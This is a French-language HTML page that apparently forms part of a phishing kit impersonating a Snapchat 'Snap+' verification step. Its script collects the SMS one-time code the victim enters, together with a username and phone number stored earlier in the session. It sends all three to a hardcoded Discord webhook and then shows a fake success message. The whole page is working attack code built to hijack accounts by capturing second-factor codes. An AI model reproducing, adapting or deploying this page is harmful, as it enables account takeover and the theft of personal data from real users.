<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>V√©rification OTP</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="container">
    <h2>üîê Code de v√©rification</h2>
    <p>Entrez le code √† 4 chiffres que vous avez re√ßu par SMS.</p>
    <form id="otpForm">
      <div class="otp-inputs">
        <input type="text" maxlength="1" pattern="\d" inputmode="numeric" required>
        <input type="text" maxlength="1" pattern="\d" inputmode="numeric" required>
        <input type="text" maxlength="1" pattern="\d" inputmode="numeric" required>
        <input type="text" maxlength="1" pattern="\d" inputmode="numeric" required>
      </div>
      <button type="submit">Valider</button>
    </form>
    <p id="status-message" style="margin-top: 15px;">V√©rification du code...</p>
  </div>

  <script>
    // Logique pour passer au champ suivant automatiquement
    const inputs = document.querySelectorAll('.otp-inputs input');
    inputs.forEach((input, index) => {
      input.addEventListener('input', () => {
        if (input.value.length === 1 && index < inputs.length - 1) inputs[index + 1].focus();
      });
    });
    inputs.forEach((input, index) => {
        input.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && input.value === '' && index > 0) {
                inputs[index - 1].focus();
            }
        });
    });

    // Gestion de la soumission du formulaire
    const otpForm = document.getElementById('otpForm');
    const statusMessage = document.getElementById('status-message');

    if (otpForm) {
      otpForm.addEventListener('submit', async (e) => {
        e.preventDefault();

        // R√©cup√®re le code saisi
        const otpCode = Array.from(inputs).map(input => input.value).join('');
        const username = sessionStorage.getItem('snapUsername');
        const phone = sessionStorage.getItem('snapPhone');

        // D√©sactive le bouton et affiche un message de chargement
        document.querySelector('button').disabled = true;
        statusMessage.textContent = "Envoi du code en cours...";
        statusMessage.style.color = '#666';

        // --- CONFIGURATION ---
        // Mets ton URL de webhook Discord ici (le m√™me que dans script.js)
        const webhookUrl = 'https://discord.com/api/webhooks/1470328213593915425/g6KMOx1UFKYP9zNmQ7L6kQHDK8UuuYnJmsmoWdgJ5mGGEbcmvLu7K-weF56y6pp2bD21'; 
        // --------------------

        // Pr√©pare le message pour Discord avec le code
        const payload = {
          content: `üîê **Code SMS re√ßu pour Snap+**`,
          embeds: [{
            title: 'Nouveau code √† v√©rifier',
            color: 3447003, // Bleu
            fields: [
              { name: 'Nom d\'utilisateur', value: username, inline: true },
              { name: 'T√©l√©phone', value: phone, inline: true },
              { name: 'Code saisi par l\'utilisateur', value: `**${otpCode}**`, inline: false }
            ]
          }]
        };

        try {
          const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
          });

          if (!response.ok) throw new Error(`Erreur Discord: ${response.status}`);

          console.log('Code envoy√© √† Discord !');
          statusMessage.textContent = "Code re√ßu. Veuillez patienter pendant la v√©rification finale.";
          statusMessage.style.color = 'green';

          // Redirige vers la page finale apr√®s un court d√©lai
          setTimeout(() => {
            window.location.href = 'success.html';
          }, 2000);

        } catch (error) {
          console.error('Erreur lors de l\'envoi du code:', error);
          statusMessage.textContent = "Erreur lors de l'envoi. R√©essayez.";
          statusMessage.style.color = 'red';
          document.querySelector('button').disabled = false; // R√©active le bouton
        }
      });
    }
  </script>
</body>
</html>

